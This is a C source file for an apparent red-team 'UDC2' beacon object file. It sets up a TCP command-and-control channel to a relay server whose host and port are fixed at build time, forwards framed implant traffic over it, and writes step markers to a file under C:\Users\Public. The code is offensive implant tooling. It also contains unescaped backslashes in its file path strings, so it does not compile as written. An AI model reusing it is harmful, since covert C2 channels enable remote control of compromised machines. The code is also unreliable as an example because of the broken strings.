/*
 * udc2_tcp.c - 4.12 UDC2 test BOF: a TCP channel over the udc2-vs contract.
 *
 * go(UDC2_INFO*) connects to the relay and fills in udc2Proxy/udc2Close.
 * Every proxy round ships the complete [4B LE len][data] frame over the
 * socket and reads the response frame back verbatim (never strip the
 * length - that is the #1 UDC2 failure mode per the template README).
 *
 * Hardcoded server/port are patched at build time via -DUDC2_HOST/-DUDC2_PORT.
 */
#include <winsock2.h>
#include <windows.h>

#ifndef UDC2_HOST
#define UDC2_HOST "127.0.0.1"
#endif
#ifndef UDC2_PORT
#define UDC2_PORT 3333
#endif

typedef int(*UDC2PROXY)(const char *, int, char *, int);
typedef void(*UDC2CLOSE)(void);

typedef struct {
	DWORD     version;
	UDC2PROXY proxy;
	UDC2CLOSE close;
} UDC2INFO;

static SOCKET g_sock = INVALID_SOCKET;
static WSADATA g_wsa;

int udc2Proxy(const char * sendBuf, int sendBufLen, char * recvBuf, int recvBufMaxLen) {
	int sent = 0;
	int n;
	unsigned int len;
	int total;

	if (g_sock == INVALID_SOCKET)
		return -1;

	/* ship the whole frame (header included) */
	while (sent < sendBufLen) {
		n = send(g_sock, sendBuf + sent, sendBufLen - sent, 0);
		if (n <= 0)
			return -1;
		sent += n;
	}

	/* read the response frame header */
	total = 0;
	while (total < 4) {
		n = recv(g_sock, recvBuf + total, 4 - total, 0);
		if (n <= 0)
			return -1;
		total += n;
	}

	len  = (unsigned char)recvBuf[0];
	len |= (unsigned char)recvBuf[1] << 8;
	len |= (unsigned char)recvBuf[2] << 16;
	len |= (unsigned char)recvBuf[3] << 24;
	if ((int)(4 + len) > recvBufMaxLen)
		return -1;

	/* read the response payload (keep the header in place) */
	while (total < 4 + (int)len) {
		n = recv(g_sock, recvBuf + total, 4 + (int)len - total, 0);
		if (n <= 0)
			return -1;
		total += n;
	}

	return total;
}

void udc2Close(void) {
	if (g_sock != INVALID_SOCKET) {
		closesocket(g_sock);
		g_sock = INVALID_SOCKET;
	}
	WSACleanup();
}

static void mark(const char * name, int v) {
	HANDLE f = CreateFileA(name, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f != INVALID_HANDLE_VALUE) {
		char b[16];
		int i = 0;
		char num[12];
		int n = 0;
		int x = v;
		if (x == 0) num[n++] = '0';
		while (x > 0 && n < 11) { num[n++] = (char)('0' + (x % 10)); x /= 10; }
		while (n && i < 14) b[i++] = num[--n];
		b[i] = 0;
		DWORD w;
		WriteFile(f, b, i, &w, NULL);
		CloseHandle(f);
	}
}

void go(UDC2INFO * info) {
	struct sockaddr_in sa;
	HOSTENT * he;
	unsigned long addr;

	mark("C:\Users\Public\udc2_step.txt", 1);

	if (info == NULL)
		return;

	mark("C:\Users\Public\udc2_step.txt", 2);

	if (WSAStartup(MAKEWORD(2, 2), &g_wsa) != 0)
		return;

	mark("C:\Users\Public\udc2_step.txt", 3);

	g_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (g_sock == INVALID_SOCKET)
		return;

	addr = inet_addr(UDC2_HOST);
	if (addr == INADDR_NONE) {
		he = gethostbyname(UDC2_HOST);
		if (he == NULL) {
			closesocket(g_sock);
			g_sock = INVALID_SOCKET;
			return;
		}
		addr = *(unsigned long *)he->h_addr_list[0];
	}

	sa.sin_family = AF_INET;
	sa.sin_port = htons(UDC2_PORT);
	sa.sin_addr.s_addr = addr;

	if (connect(g_sock, (struct sockaddr *)&sa, sizeof(sa)) == SOCKET_ERROR) {
		mark("C:\Users\Public\udc2_step.txt", (int)WSAGetLastError());
		closesocket(g_sock);
		g_sock = INVALID_SOCKET;
		return;
	}

	mark("C:\Users\Public\udc2_step.txt", 9);

	mark("C:\Users\Public\udc2_step.txt", 10);
	info->proxy = udc2Proxy;
	info->close = udc2Close;
}
